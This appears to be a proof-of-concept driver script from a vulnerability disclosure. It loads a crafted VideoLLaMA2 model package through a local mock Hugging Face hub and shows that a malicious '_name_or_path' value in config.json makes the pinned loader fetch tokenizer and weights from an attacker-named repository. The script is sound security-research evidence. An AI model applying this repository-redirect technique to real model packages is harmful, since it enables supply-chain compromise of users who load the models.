"""Victim-side driver: load one VideoLLaMA2 main model package through the REAL
pinned loader exactly as the documented public API does
(videollama2/__init__.py:14 model_init(model_path) -> load_pretrained_model with
model_base=None), with the local mock hub standing in for the Hugging Face
endpoint.

usage: python run_poc.py pkg_attacker | pkg_victim
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(HERE, "work")
PKG = os.path.join(WORK, sys.argv[1] if len(sys.argv) > 1 else "pkg_attacker")
REQLOG = os.path.join(WORK, "hub_requests.log")

ATTACKER_REPO = "attacker/videollama2-base"
VICTIM_REPO = "victim/videollama2-approved"

# fresh per-arm HF cache so every run really goes over HTTP to the mock hub
os.environ["HF_HOME"] = os.path.join(WORK, "hf-home-" + os.path.basename(PKG))
os.environ["HF_ENDPOINT"] = "http://127.0.0.1:8765"
os.environ["HF_HUB_DISABLE_TELEMETRY"] = "1"
os.environ["HF_HUB_DISABLE_SYMLINKS_WARNING"] = "1"

import shutil  # noqa: E402

if os.path.isdir(os.environ["HF_HOME"]):
    shutil.rmtree(os.environ["HF_HOME"])

sys.path.insert(0, os.path.join(HERE, "VideoLLaMA2-c0bb03abf6b8"))

import mock_hub  # noqa: E402

if os.path.exists(REQLOG):
    os.remove(REQLOG)
mock_hub.start_server(port=8765, hub_root=os.path.join(WORK, "hub"), request_log=REQLOG)
print("[victim] mock hub on 127.0.0.1:8765 serving %s" % os.path.join(WORK, "hub"))


class _Tee:
    """Keep a copy of this run's stdout (evidence file for the report)."""

    def __init__(self, *streams):
        self.streams = streams

    def write(self, s):
        for st in self.streams:
            st.write(s)
            st.flush()

    def flush(self):
        for st in self.streams:
            st.flush()


CONSOLE_LOG = os.path.join(WORK, "console-" + os.path.basename(PKG) + ".log")
sys.stdout = _Tee(sys.stdout, open(CONSOLE_LOG, "w", encoding="utf-8"))

import json  # noqa: E402

from transformers import PretrainedConfig, AutoConfig  # noqa: E402

import videollama2  # noqa: E402  (registers videollama2_mistral with AutoConfig)

with open(os.path.join(PKG, "config.json"), encoding="utf-8") as f:
    cfg = json.load(f)
print("[victim] package            : %s" % PKG)
print("[victim] config.model_type  : %s" % cfg.get("model_type"))
print("[victim] config.tune_mm_mlp_adapter : %s" % cfg.get("tune_mm_mlp_adapter"))
print("[victim] config._name_or_path = %r" % cfg.get("_name_or_path"))

pc = PretrainedConfig.from_pretrained(PKG)
ac = AutoConfig.from_pretrained(PKG)
print("[victim] PretrainedConfig.from_pretrained(pkg)._name_or_path -> %r" % pc._name_or_path)
print("[victim]           (the JSON value survives: this is what line 144 reuses)")
print("[victim] AutoConfig.from_pretrained(pkg)._name_or_path       -> %r" % ac._name_or_path)
print("[victim]           (AutoConfig would have rewritten it to the local path)")

print("[victim] calling videollama2.model_init(%s)" % PKG)
try:
    model, processor, tokenizer = videollama2.model_init(PKG, device="cpu")
    print("[victim] load : SUCCESS (%s)" % type(model).__name__)
except Exception as e:  # noqa: BLE001
    tb = sys.exc_info()[2]
    while tb.tb_next is not None:
        tb = tb.tb_next
    print("[victim] load : model_init raised %s: %s" % (type(e).__name__, str(e)[:120]))
    print("[victim]         last frame: %s:%s (in the pinned loader)" % (
        os.path.basename(tb.tb_frame.f_code.co_filename), tb.tb_lineno))

lines = open(REQLOG, encoding="utf-8").read().splitlines() if os.path.exists(REQLOG) else []
gets = sorted(set(l for l in lines if l.startswith("GET ")))
print("-" * 72)
print("[victim] repositories contacted (from mock-hub request log):")
for l in gets:
    print("[victim]   %s" % l)
hit_attacker = any(ATTACKER_REPO in l for l in gets)
hit_victim = any(VICTIM_REPO in l for l in gets)
print("-" * 72)
if hit_attacker and not hit_victim:
    print("[victim] RESULT: REPO REDIRECT CONFIRMED - tokenizer and weights were fetched")
    print("[victim]         from the repository named in config.json `_name_or_path`")
elif hit_victim and not hit_attacker:
    print("[victim] RESULT: no redirect - only the approved repository was contacted")
else:
    print("[victim] RESULT: unexpected request pattern (attacker=%s victim=%s)"
          % (hit_attacker, hit_victim))
